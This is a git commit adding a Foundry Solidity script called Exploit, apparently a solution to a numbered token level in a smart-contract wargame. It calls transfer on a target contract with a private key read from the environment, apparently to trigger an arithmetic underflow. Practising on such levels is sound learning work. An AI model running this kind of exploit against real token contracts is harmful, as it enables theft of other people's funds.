0a157414abeeccf0db903a5de97dc6564040dc8c
bt3gl <bt3gl@dreamland.com>
2023-08-16 15:21:08 -0700

    pwned

---
+++ script/05/Token.s.sol
@@ -0,0 +1,18 @@
+// SPDX-License-Identifier: CC-BY-4.0
+pragma solidity ^0.6.0;
+
+import "forge-std/Script.sol";
+import {Token} from "src/05/Token.sol";
+
+contract Exploit is Script {
+
+        address levelInstance = 0x1e8407c9A9f3D689E8f48C63eaF04fe0bd549629;
+        Token level = Token(levelInstance);        
+        
+        function run() external {
+
+            vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+            level.transfer(0x0000000000000000000000000000000000000000, 21);
+            vm.stopBroadcast();
+    }
+}
